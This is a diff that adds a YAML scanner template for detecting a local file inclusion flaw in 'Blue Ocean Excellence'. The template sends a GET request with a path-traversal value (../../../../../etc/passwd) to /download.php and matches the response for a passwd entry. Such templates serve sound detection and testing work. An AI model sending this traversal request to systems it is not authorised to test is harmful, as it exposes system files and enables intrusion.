@@ -1,0 +1,21 @@
+id: blue-ocean-excellence-lfi
+name: Blue Ocean Excellence - Local File Inclusion
+severity: high
+confidence: tentative
+description: Blue Ocean Excellence is vulnerable to local file inclusion.
+reference: CWE-22
+tags:
+- blue-ocean
+- lfi
+- vuln
+requests:
+- method: GET
+  path: /download.php?file=../../../../../etc/passwd
+  matchers:
+  - type: regex
+    regex:
+    - toor:[x*]:0:0
+  - type: status
+    status:
+    - 200
+  condition: and
